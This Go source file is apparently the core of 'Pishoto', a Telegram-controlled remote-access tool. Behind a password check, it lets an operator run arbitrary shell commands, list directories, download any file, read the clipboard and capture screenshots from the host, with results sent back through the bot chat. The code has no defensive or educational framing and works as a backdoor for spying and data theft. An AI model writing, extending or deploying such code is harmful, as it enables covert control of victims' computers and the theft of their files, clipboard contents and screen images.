package main

import (
	_ "embed"
	"os"
	"strings"
	"path/filepath"
)

func sendFile(chatID int64, fullpath string) {
    data, err := os.ReadFile(fullpath)
    if err != nil {
        SendMessage(chatID, "-")
        return
    }
	sendDocument(chatID, filepath.Base(fullpath), data)
}

func parseCommand(chatID int64, text string) {
	commandParts := strings.Split(text, " ")
	commandType := commandParts[0]
	switch commandType {
	case "/info":
		getInfo(chatID)
	case "/cmd":
		executeCommand(chatID, commandParts[1:])
	case "/showdir":
		showDir(chatID, strings.Trim(strings.Join(commandParts[1:], " "), `"'`))
	case "/down":
		sendFile(chatID, strings.Trim(strings.Join(commandParts[1:], " "), `"'`))
	case "/clip":
		getClipboard(chatID)
	case "/screen":
		takeScreenshots(chatID)
	default:
		SendMessage(chatID, "No such command 🥴")
	}
}

func onStart() {

}


func main() {

	onStart()

	for {
		updates, _ := GetUpdates(offset)
		for _, update := range updates.Result {
			offset = update.UpdateID + 1
			chatID := update.Message.Chat.ID
			text := update.Message.Text
			if contains(chatIDs, chatID) {
				parseCommand(chatID, text)
			} else if md5Hash(text) == passMd5 {
				chatIDs = append(chatIDs, chatID)
				responseText := "Password confirmed. \nPishoto is welcoming you 🤖"
				SendMessage(chatID, responseText)
			} else {
				responseText := "Wrong password."
				SendMessage(chatID, responseText)
			}
		}
	}
}
